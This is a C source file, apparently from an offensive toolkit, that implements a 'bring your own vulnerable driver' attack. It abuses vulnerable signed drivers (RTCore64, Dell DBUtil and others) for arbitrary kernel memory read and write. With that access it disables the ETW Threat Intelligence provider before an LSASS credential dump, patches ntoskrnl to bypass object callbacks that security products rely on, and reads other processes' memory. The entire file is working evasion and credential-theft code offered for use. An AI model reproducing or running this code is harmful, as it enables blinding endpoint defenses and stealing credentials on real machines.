/**
 * BYOVD — Load a vulnerable signed driver to disable ETW-Ti before LSASS dump.
 *
 * Supported drivers:
 *   - RTCore64.sys  (MSI Afterburner)  — device \??\RTCore64
 *   - DBUtil_2_3.sys (Dell CVE-2021-21551) — device \??\DBUtil_2_3
 *
 * Flow: open device → find ntoskrnl EtwThreatIntProvRegHandle → zero it →
 *       dump LSASS (no ETW-Ti events) → restore handle → close device.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/byovd.h"

/* ── ETW-Ti provider GUID {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} ── */

static const BYTE ETWTI_GUID[16] = {
    0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
    0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44
};

/* ── Driver IOCTL constants ──────────────────────────────── */

#define RTCORE_READ_MEM     0x80002048
#define RTCORE_WRITE_MEM    0x8000204C
#define DBUTIL_READ_VM      0x9B0C1EC8
#define DBUTIL_WRITE_VM     0x9B0C1EC4
#define WINNOTIFY_READ      0x222040
#define WINNOTIFY_WRITE     0x222044
#define KKYUM_READ          0x22265C
#define KKYUM_WRITE         0x222658

#pragma pack(push, 1)
typedef struct _RTCORE_RW {
    BYTE    pad0[8];
    ULONG64 Address;
    BYTE    pad1[8];
    DWORD   Size;
    DWORD   Value;
    BYTE    pad2[16];
} RTCORE_RW; /* 48 bytes */
#pragma pack(pop)

/* ── NtQuerySystemInformation structures ─────────────────── */

#define SystemModuleInformation 11

typedef struct _RTL_PROCESS_MODULE_INFO {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR   FullPathName[256];
} RTL_PROCESS_MODULE_INFO;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFO Modules[1];
} RTL_PROCESS_MODULES;

/* ── Globals ─────────────────────────────────────────────── */

static HANDLE g_drv_handle;
static int    g_drv_type = -1;  /* 0=RTCore64, 1=DBUtil, 2=WinNotify, 3=KKYUM */
static ULONG64 g_etwti_addr;
static ULONG64 g_etwti_saved;

static BYOVD_DEBUG g_byovd_dbg;

/* ── Helpers ─────────────────────────────────────────────── */

static inline void bz(void *dst, SIZE_T len) {
    BYTE *p = (BYTE *)dst;
    while (len--) *p++ = 0;
}

static inline int wmatch(const BYTE *a, const BYTE *b, int n) {
    for (int i = 0; i < n; i++)
        if (a[i] != b[i]) return 0;
    return 1;
}

static PVOID vm_alloc(SIZE_T size) {
    PVOID base = NULL;
    SIZE_T rgn = size;
    NTSTATUS st = sys_NtAllocateVirtualMemory(
        (HANDLE)-1, &base, 0, &rgn,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    return NT_SUCCESS(st) ? base : NULL;
}

static void vm_free(PVOID ptr) {
    if (!ptr) return;
    SIZE_T sz = 0;
    sys_NtFreeVirtualMemory((HANDLE)-1, &ptr, &sz, MEM_RELEASE);
}

/* ── Open driver device ──────────────────────────────────── */

static HANDLE open_device(const wchar_t *path) {
    int len = 0;
    while (path[len]) len++;

    UNICODE_STRING us;
    us.Buffer = (PWSTR)path;
    us.Length = (USHORT)(len * 2);
    us.MaximumLength = us.Length + 2;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE h = NULL;
    NTSTATUS st = sys_NtCreateFile(&h, 0xC0000000, &oa, &iosb,
        NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
    return NT_SUCCESS(st) ? h : NULL;
}

BOOL byovd_open(void) {
    wchar_t d3[] = L"\\??\\KKYUM";
    g_drv_handle = open_device(d3);
    if (g_drv_handle) { g_drv_type = 3; return TRUE; }

    wchar_t d2[] = L"\\??\\WinNotify";
    g_drv_handle = open_device(d2);
    if (g_drv_handle) { g_drv_type = 2; return TRUE; }

    wchar_t d0[] = L"\\??\\RTCore64";
    g_drv_handle = open_device(d0);
    if (g_drv_handle) { g_drv_type = 0; return TRUE; }

    wchar_t d1[] = L"\\??\\DBUtil_2_3";
    g_drv_handle = open_device(d1);
    if (g_drv_handle) { g_drv_type = 1; return TRUE; }

    return FALSE;
}

void byovd_close(void) {
    if (g_drv_handle) {
        sys_NtClose(g_drv_handle);
        g_drv_handle = NULL;
    }
    g_drv_type = -1;
}

/* ── Kernel read / write via driver ──────────────────────── */

static BOOL kread32(ULONG64 addr, DWORD *val) {
    IO_STATUS_BLOCK iosb;

    if (g_drv_type == 3) {
        BYTE in[32];
        bz(in, 32);
        *(int *)(in + 0) = 4;
        *(int *)(in + 4) = 1;
        *(ULONG64 *)(in + 8)  = addr;
        *(ULONG64 *)(in + 16) = (ULONG64)(ULONG_PTR)val;
        *(ULONG64 *)(in + 24) = 4;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            KKYUM_READ, in, 32, in, 32);
        return NT_SUCCESS(st);
    }

    if (g_drv_type == 0) {
        RTCORE_RW rw;
        bz(&rw, sizeof(rw));
        rw.Address = addr;
        rw.Size = 4;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            RTCORE_READ_MEM, &rw, sizeof(rw), &rw, sizeof(rw));
        if (!NT_SUCCESS(st)) return FALSE;
        *val = rw.Value;
        return TRUE;
    }

    if (g_drv_type == 1) {
        BYTE buf[32];
        bz(buf, 32);
        *(ULONG64 *)(buf + 8)  = addr;
        *(DWORD   *)(buf + 24) = 4;
        BYTE out[32];
        bz(out, 32);
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            DBUTIL_READ_VM, buf, 28, out, 32);
        if (!NT_SUCCESS(st)) return FALSE;
        *val = *(DWORD *)out;
        return TRUE;
    }

    if (g_drv_type == 2) {
        BYTE in[0x38];
        bz(in, 0x38);
        *(ULONG64 *)(in + 0x00) = addr;
        *(ULONG64 *)(in + 0x08) = 0;
        BYTE out[0x40];
        bz(out, 0x40);
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            WINNOTIFY_READ, in, 0x38, out, 0x40);
        if (!NT_SUCCESS(st)) return FALSE;
        *val = *(DWORD *)(out + 0x10);
        return TRUE;
    }
    return FALSE;
}

static BOOL kwrite32(ULONG64 addr, DWORD val) {
    IO_STATUS_BLOCK iosb;

    if (g_drv_type == 3) {
        DWORD src = val;
        BYTE in[32];
        bz(in, 32);
        *(int *)(in + 0) = 4;
        *(int *)(in + 4) = 1;
        *(ULONG64 *)(in + 8)  = addr;
        *(ULONG64 *)(in + 16) = (ULONG64)(ULONG_PTR)&src;
        *(ULONG64 *)(in + 24) = 4;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            KKYUM_WRITE, in, 32, in, 32);
        return NT_SUCCESS(st);
    }

    if (g_drv_type == 0) {
        RTCORE_RW rw;
        bz(&rw, sizeof(rw));
        rw.Address = addr;
        rw.Size = 4;
        rw.Value = val;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            RTCORE_WRITE_MEM, &rw, sizeof(rw), &rw, sizeof(rw));
        return NT_SUCCESS(st);
    }

    if (g_drv_type == 1) {
        BYTE buf[32];
        bz(buf, 32);
        *(ULONG64 *)(buf + 8)  = addr;
        *(DWORD   *)(buf + 24) = 4;
        *(DWORD   *)(buf + 28) = val;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            DBUTIL_WRITE_VM, buf, 32, buf, 32);
        return NT_SUCCESS(st);
    }

    if (g_drv_type == 2) {
        DWORD src_val = val;
        BYTE in[0x18];
        bz(in, 0x18);
        *(ULONG64 *)(in + 0x00) = (ULONG64)(ULONG_PTR)&src_val;
        *(ULONG64 *)(in + 0x08) = 4;
        *(ULONG64 *)(in + 0x10) = addr;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            WINNOTIFY_WRITE, in, 0x18, in, 0x18);
        return NT_SUCCESS(st);
    }
    return FALSE;
}

static BOOL kread64(ULONG64 addr, ULONG64 *val) {
    if (g_drv_type == 3) {
        IO_STATUS_BLOCK iosb;
        BYTE in[32];
        bz(in, 32);
        *(int *)(in + 0) = 4;
        *(int *)(in + 4) = 1;
        *(ULONG64 *)(in + 8)  = addr;
        *(ULONG64 *)(in + 16) = (ULONG64)(ULONG_PTR)val;
        *(ULONG64 *)(in + 24) = 8;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            KKYUM_READ, in, 32, in, 32);
        return NT_SUCCESS(st);
    }
    if (g_drv_type == 2) {
        IO_STATUS_BLOCK iosb;
        BYTE in[0x38];
        bz(in, 0x38);
        *(ULONG64 *)(in + 0x00) = addr;
        *(ULONG64 *)(in + 0x08) = 0;
        BYTE out[0x40];
        bz(out, 0x40);
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            WINNOTIFY_READ, in, 0x38, out, 0x40);
        if (!NT_SUCCESS(st)) return FALSE;
        *val = *(ULONG64 *)(out + 0x10);
        return TRUE;
    }
    DWORD lo, hi;
    if (!kread32(addr, &lo)) return FALSE;
    if (!kread32(addr + 4, &hi)) return FALSE;
    *val = (ULONG64)lo | ((ULONG64)hi << 32);
    return TRUE;
}

static BOOL kwrite64(ULONG64 addr, ULONG64 val) {
    if (g_drv_type == 3) {
        IO_STATUS_BLOCK iosb;
        ULONG64 src = val;
        BYTE in[32];
        bz(in, 32);
        *(int *)(in + 0) = 4;
        *(int *)(in + 4) = 1;
        *(ULONG64 *)(in + 8)  = addr;
        *(ULONG64 *)(in + 16) = (ULONG64)(ULONG_PTR)&src;
        *(ULONG64 *)(in + 24) = 8;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            KKYUM_WRITE, in, 32, in, 32);
        return NT_SUCCESS(st);
    }
    if (g_drv_type == 2) {
        IO_STATUS_BLOCK iosb;
        ULONG64 src_val = val;
        BYTE in[0x18];
        bz(in, 0x18);
        *(ULONG64 *)(in + 0x00) = (ULONG64)(ULONG_PTR)&src_val;
        *(ULONG64 *)(in + 0x08) = 8;
        *(ULONG64 *)(in + 0x10) = addr;
        NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
            NULL, NULL, NULL, &iosb,
            WINNOTIFY_WRITE, in, 0x18, in, 0x18);
        return NT_SUCCESS(st);
    }
    if (!kwrite32(addr, (DWORD)(val & 0xFFFFFFFF))) return FALSE;
    if (!kwrite32(addr + 4, (DWORD)(val >> 32))) return FALSE;
    return TRUE;
}

/* ── Get ntoskrnl base from NtQuerySystemInformation ─────── */

static ULONG64 get_ntos_base(void) {
    ULONG needed = 0;
    sys_NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &needed);
    if (needed == 0) needed = 0x10000;

    PVOID buf = vm_alloc((SIZE_T)needed + 4096);
    if (!buf) return 0;

    NTSTATUS st = sys_NtQuerySystemInformation(SystemModuleInformation,
        buf, needed + 4096, &needed);

    ULONG64 base = 0;
    if (NT_SUCCESS(st)) {
        RTL_PROCESS_MODULES *mods = (RTL_PROCESS_MODULES *)buf;
        if (mods->NumberOfModules > 0)
            base = (ULONG64)(ULONG_PTR)mods->Modules[0].ImageBase;
    }

    vm_free(buf);
    return base;
}

/* ── Read file section from disk ─────────────────────────── */

static HANDLE open_ntos_file(void) {
    wchar_t path[] = L"\\??\\C:\\Windows\\System32\\ntoskrnl.exe";
    int len = 0;
    while (path[len]) len++;

    UNICODE_STRING us;
    us.Buffer = path;
    us.Length = (USHORT)(len * 2);
    us.MaximumLength = us.Length + 2;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE hf = NULL;
    sys_NtCreateFile(&hf, 0x80100000,
        &oa, &iosb, NULL, 0,
        FILE_SHARE_READ, FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0);
    return hf;
}

static BOOL read_at(HANDLE hf, ULONG64 offset, BYTE *buf, DWORD size) {
    IO_STATUS_BLOCK iosb;
    DWORD done = 0;
    while (done < size) {
        LARGE_INTEGER pos;
        pos.QuadPart = (LONGLONG)(offset + done);
        DWORD chunk = size - done;
        if (chunk > 65536) chunk = 65536;
        NTSTATUS st = sys_NtReadFile(hf, NULL, NULL, NULL, &iosb,
            buf + done, chunk, &pos, NULL);
        if (!NT_SUCCESS(st) || iosb.Information == 0) break;
        done += (DWORD)iosb.Information;
    }
    return done == size;
}

/* ── Find EtwThreatIntProvRegHandle in ntoskrnl ──────────── */

static ULONG64 find_etwti_handle_rva(HANDLE hf) {
    /* Step 1: read PE header */
    BYTE hdr[4096];
    bz(hdr, 4096);
    if (!read_at(hf, 0, hdr, 4096))
        return 0;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
    if (dos->e_lfanew < 0 || dos->e_lfanew > 3900) return 0;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(hdr + dos->e_lfanew);
    DWORD num_sec = nt->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
        ((BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    /* Step 2: find data and code sections */
    DWORD guid_sec_rva = 0, guid_sec_raw = 0, guid_sec_sz = 0;

    for (DWORD i = 0; i < num_sec && i < 40; i++) {
        BYTE *n = sec[i].Name;
        if (n[0] == '.' && n[1] == 'r' && n[2] == 'd' &&
            n[3] == 'a' && n[4] == 't' && n[5] == 'a') {
            guid_sec_rva = sec[i].VirtualAddress;
            guid_sec_raw = sec[i].PointerToRawData;
            guid_sec_sz  = sec[i].SizeOfRawData;
        }
    }

    if (!guid_sec_rva) {
        for (DWORD i = 0; i < num_sec && i < 40; i++) {
            BYTE *n = sec[i].Name;
            if (n[0] == '.' && n[1] == 'd' && n[2] == 'a' &&
                n[3] == 't' && n[4] == 'a') {
                guid_sec_rva = sec[i].VirtualAddress;
                guid_sec_raw = sec[i].PointerToRawData;
                guid_sec_sz  = sec[i].SizeOfRawData;
                break;
            }
        }
    }
    if (!guid_sec_rva || !guid_sec_sz) return 0;

    /* Step 3: read data section, collect all GUID occurrences */
    if (guid_sec_sz > 0x800000) guid_sec_sz = 0x800000;
    BYTE *rdata = (BYTE *)vm_alloc(guid_sec_sz);
    if (!rdata) return 0;

    if (!read_at(hf, guid_sec_raw, rdata, guid_sec_sz)) {
        vm_free(rdata);
        return 0;
    }

    DWORD guid_rvas[8];
    int guid_count = 0;
    for (DWORD i = 0; i + 16 <= guid_sec_sz && guid_count < 8; i++) {
        if (wmatch(rdata + i, ETWTI_GUID, 16))
            guid_rvas[guid_count++] = guid_sec_rva + i;
    }
    vm_free(rdata);

    if (!guid_count) return 0;

    /* Step 4: for each GUID, scan code sections for LEA RCX xref */
    DWORD handle_rva = 0;

    for (int gi = 0; gi < guid_count && !handle_rva; gi++) {
        DWORD guid_rva = guid_rvas[gi];

        for (DWORD si = 0; si < num_sec && si < 40 && !handle_rva; si++) {
            if (!(sec[si].Characteristics & 0x20000000))
                continue;
            DWORD code_rva = sec[si].VirtualAddress;
            DWORD code_raw = sec[si].PointerToRawData;
            DWORD code_sz  = sec[si].SizeOfRawData;
            if (!code_raw || !code_sz) continue;
            if (code_sz > 0xA00000) code_sz = 0xA00000;

            BYTE *text = (BYTE *)vm_alloc(code_sz);
            if (!text) continue;

            if (!read_at(hf, code_raw, text, code_sz)) {
                vm_free(text);
                continue;
            }

            for (DWORD i = 0; i + 7 <= code_sz; i++) {
                if (text[i] != 0x48 || text[i+1] != 0x8D || text[i+2] != 0x0D)
                    continue;

                DWORD instr_rva = code_rva + i;
                int disp = *(int *)(text + i + 3);
                DWORD target = instr_rva + 7 + disp;

                if (target != guid_rva)
                    continue;

                for (DWORD j = i + 7; j + 7 <= code_sz && j < i + 80; j++) {
                    if (text[j] == 0x4C && text[j+1] == 0x8D && text[j+2] == 0x0D) {
                        DWORD j_rva = code_rva + j;
                        int hdisp = *(int *)(text + j + 3);
                        handle_rva = j_rva + 7 + hdisp;
                        break;
                    }
                }
                if (handle_rva) break;
            }
            vm_free(text);
        }
    }

    return (ULONG64)handle_rva;
}

/* ── OB callback bypass via ntoskrnl code patching ────── */

/* ObpIncrementHandleCountEx pattern:
   lea r12,[rbp+10]; cmp [rbx+78],r15; jne <callback_invoke> */
static const BYTE OB_PATTERN[] = {
    0x4C, 0x8D, 0x65, 0x10,
    0x4C, 0x39, 0x7B, 0x78,
    0x0F, 0x85
};
#define OB_PATTERN_LEN 10
#define OB_JNE_OFFSET  8

static ULONG64 g_ob_patch_addr;
static ULONG64 g_ob_patch_orig;

static DWORD find_ob_jne_rva(HANDLE hf) {
    BYTE hdr[4096];
    bz(hdr, 4096);
    if (!read_at(hf, 0, hdr, 4096)) return 0;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
    if (dos->e_lfanew < 0 || dos->e_lfanew > 3900) return 0;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(hdr + dos->e_lfanew);
    DWORD num_sec = nt->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
        ((BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    for (DWORD i = 0; i < num_sec && i < 40; i++) {
        BYTE *n = sec[i].Name;
        if (n[0] != 'P' || n[1] != 'A' || n[2] != 'G' || n[3] != 'E')
            continue;

        DWORD page_rva = sec[i].VirtualAddress;
        DWORD page_raw = sec[i].PointerToRawData;
        DWORD page_sz  = sec[i].SizeOfRawData;
        if (!page_raw || !page_sz) continue;
        if (page_sz > 0x500000) page_sz = 0x500000;

        BYTE *page = (BYTE *)vm_alloc(page_sz);
        if (!page) continue;

        if (!read_at(hf, page_raw, page, page_sz)) {
            vm_free(page);
            continue;
        }

        for (DWORD off = 0; off + OB_PATTERN_LEN + 4 <= page_sz; off++) {
            if (wmatch(page + off, OB_PATTERN, OB_PATTERN_LEN)) {
                DWORD jne_rva = page_rva + off + OB_JNE_OFFSET;
                vm_free(page);
                return jne_rva;
            }
        }
        vm_free(page);
    }
    return 0;
}

static void dbg_write(char c) {
    wchar_t p[] = L"\\??\\C:\\Windows\\Temp\\_ob.txt";
    int pl = 0; while (p[pl]) pl++;
    UNICODE_STRING us; us.Buffer = p;
    us.Length = (USHORT)(pl * 2); us.MaximumLength = us.Length + 2;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iosb;
    HANDLE hf = NULL;
    sys_NtCreateFile(&hf, FILE_APPEND_DATA | SYNCHRONIZE, &oa, &iosb,
        NULL, 0x80, 0, FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (hf) {
        sys_NtWriteFile(hf, NULL, NULL, NULL, &iosb, &c, 1, NULL, NULL);
        sys_NtClose(hf);
    }
}

int byovd_disable_ob_callbacks(void) {
    g_ob_patch_addr = 0;
    g_ob_patch_orig = 0;

    dbg_write('A');
    HANDLE hf = open_ntos_file();
    if (!hf) { g_byovd_dbg.ob_rc = 0x20; return -1; }

    dbg_write('B');
    DWORD jne_rva = find_ob_jne_rva(hf);
    sys_NtClose(hf);
    dbg_write('C');
    if (!jne_rva) { g_byovd_dbg.ob_rc = 0x21; return -2; }

    ULONG64 ntos_base = g_byovd_dbg.ntos_base;
    ULONG64 patch_addr = ntos_base + jne_rva;
    g_byovd_dbg.edr_base = patch_addr;
    g_byovd_dbg.edr_size = jne_rva;

    dbg_write('D');
    ULONG64 orig = 0;
    if (!kread64(patch_addr, &orig)) {
        g_byovd_dbg.ob_rc = 0x22;
        dbg_write('x');
        return -3;
    }
    dbg_write('E');
    g_byovd_dbg.ob_data = orig;

    BYTE *ob = (BYTE *)&orig;
    if (ob[0] != 0x0F || ob[1] != 0x85) {
        g_byovd_dbg.ob_rc = 0x23;
        dbg_write('y');
        return -4;
    }

    g_ob_patch_addr = patch_addr;
    g_ob_patch_orig = orig;
    g_byovd_dbg.ob_saved = orig;

    ULONG64 patched = orig;
    BYTE *pb = (BYTE *)&patched;
    pb[0] = 0x90; pb[1] = 0x90; pb[2] = 0x90;
    pb[3] = 0x90; pb[4] = 0x90; pb[5] = 0x90;

    dbg_write('F');
    if (!kwrite64(patch_addr, patched)) {
        g_byovd_dbg.ob_rc = 0x24;
        g_ob_patch_addr = 0;
        dbg_write('w');
        return -5;
    }
    dbg_write('G');

    ULONG64 readback = 0;
    kread64(patch_addr, &readback);
    dbg_write('H');
    g_byovd_dbg.ob_data = readback;

    BYTE *rb = (BYTE *)&readback;
    if (rb[0] != 0x90 || rb[1] != 0x90) {
        g_byovd_dbg.ob_rc = 0x25;
        kwrite64(patch_addr, g_ob_patch_orig);
        g_ob_patch_addr = 0;
        return -6;
    }

    g_byovd_dbg.ob_rc = 0xCC;
    return 0;
}

BOOL byovd_restore_ob_callbacks(void) {
    if (!g_ob_patch_addr || !g_drv_handle)
        return FALSE;
    return kwrite64(g_ob_patch_addr, g_ob_patch_orig);
}

/* ── Public API ──────────────────────────────────────────── */

int byovd_disable_etwti(void) {
    bz(&g_byovd_dbg, sizeof(g_byovd_dbg));

    if (!g_drv_handle || g_drv_type < 0)
        return -1;

    ULONG64 ntos_base = get_ntos_base();
    if (!ntos_base) return -2;
    g_byovd_dbg.ntos_base = ntos_base;

    HANDLE hf = open_ntos_file();
    if (!hf) return -3;

    ULONG64 handle_rva = find_etwti_handle_rva(hf);
    sys_NtClose(hf);

    if (!handle_rva) return -4;
    g_byovd_dbg.handle_rva = (DWORD)handle_rva;

    g_etwti_addr = ntos_base + handle_rva;

    if (!kread64(g_etwti_addr, &g_etwti_saved))
        return -5;
    g_byovd_dbg.old_value = g_etwti_saved;

    if (!kwrite64(g_etwti_addr, 0))
        return -6;

    ULONG64 readback = 0xDEAD;
    kread64(g_etwti_addr, &readback);
    g_byovd_dbg.readback = readback;

    return 0;
}

BYOVD_DEBUG *byovd_get_debug(void) {
    return &g_byovd_dbg;
}

BOOL byovd_restore_etwti(void) {
    if (!g_drv_handle || !g_etwti_addr)
        return FALSE;

    return kwrite64(g_etwti_addr, g_etwti_saved);
}

int byovd_get_drv_type(void) { return g_drv_type; }

BOOL byovd_read_vm(DWORD pid, PVOID remote_addr, PVOID local_buf, SIZE_T size, SIZE_T *bytes_read) {
    if (g_drv_type != 3 || !g_drv_handle) return FALSE;

    IO_STATUS_BLOCK iosb;
    BYTE in[32];
    bz(in, 32);
    *(int *)(in + 0) = (int)pid;
    *(int *)(in + 4) = 1;
    *(ULONG64 *)(in + 8)  = (ULONG64)(ULONG_PTR)remote_addr;
    *(ULONG64 *)(in + 16) = (ULONG64)(ULONG_PTR)local_buf;
    *(ULONG64 *)(in + 24) = (ULONG64)size;
    NTSTATUS st = sys_NtDeviceIoControlFile(g_drv_handle,
        NULL, NULL, NULL, &iosb,
        KKYUM_READ, in, 32, in, 32);
    if (NT_SUCCESS(st)) {
        if (bytes_read) *bytes_read = size;
        return TRUE;
    }
    if (bytes_read) *bytes_read = 0;
    return FALSE;
}
